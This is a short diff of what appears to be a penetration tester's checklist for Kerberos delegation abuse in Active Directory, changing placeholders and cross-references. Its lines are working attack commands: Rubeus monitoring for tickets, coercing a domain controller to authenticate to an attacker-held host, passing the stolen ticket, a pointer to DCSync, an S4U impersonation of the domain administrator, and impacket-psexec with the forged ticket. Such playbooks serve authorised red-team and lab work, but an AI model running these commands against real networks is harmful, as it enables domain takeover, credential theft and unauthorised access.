@@ -17,9 +17,9 @@ serve
 serve files rubeus
 - [ ] Rubeus.exe fetched on the host I own with the line serve files gives
 .\Rubeus.exe monitor /interval:5 /nowrap
-- [ ] Coerce a DC to authenticate to that host: :Pb responder, the coerce_plus module
+- [ ] Coerce a DC to authenticate to that host: :Pb responder, the coerce_plus module, with LISTENER=<Hostname>.<Domain>, the host I own, not Kali's address
 .\Rubeus.exe ptt /ticket:THE-BASE64
-- [ ] The DC's TGT loaded: DCSync is next, :Pb acl-abuse
+- [ ] The DC's TGT loaded: DCSync is next, :Pb dcsync
 
 ## Constrained: a service that may delegate to named SPNs
 - [ ] findDelegation lists the SPNs in msDS-AllowedToDelegateTo for the account I hold
@@ -44,7 +44,7 @@ export KRB5CCNAME=THE-CCACHE
 impacket-psexec -k -no-pass '<Domain>/administrator@<Hostname>.<Domain>'
 
 ## From a Windows shell
-.\Rubeus.exe s4u /user:ATTACK$ /rc4:THE-NT-HASH /impersonateuser:administrator /msdsspn:cifs/<DCHost> /ptt
+.\Rubeus.exe s4u /user:ATTACK$ /rc4:THE-NT-HASH /impersonateuser:administrator /msdsspn:cifs/<Hostname>.<Domain> /ptt
 - [ ] /rc4 is the NT hash of the account that holds the delegation right
 
 ## Clean up and next
